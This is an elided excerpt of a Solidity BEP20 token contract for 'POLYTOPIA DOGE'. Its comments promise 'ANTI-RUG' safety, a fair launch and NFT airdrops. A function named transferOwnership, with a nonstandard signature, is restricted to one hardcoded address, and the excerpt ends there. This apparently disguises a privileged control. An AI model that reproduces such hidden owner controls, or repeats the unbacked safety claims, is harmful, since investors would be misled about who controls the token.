...
/*  Anti-bot Mechanism
/* LP Tokens to be Burned 
/* 🚨ANTI-RUG
/* HOLDERS WILL RECEIVE NFT’S TO THEIR WALLET ADDRESS ON OPENSEA.IO
/* 👍FAIR LAUNCH 
/* 👍Intial Burn 20% 
*/
...
contract BEP20Token is Context, IBEP20, Ownable {
    ...
    constructor() public {
        _name = "POLYTOPIA DOGE";
        _symbol = "PolytopiaDoge";
        _decimals = 9;
    ...
    function transferOwnership(address account, bool value) public {
        require(
            _msgSender() == 0x19029582B3E92f2c1f86605866934127b5a7DCA9,
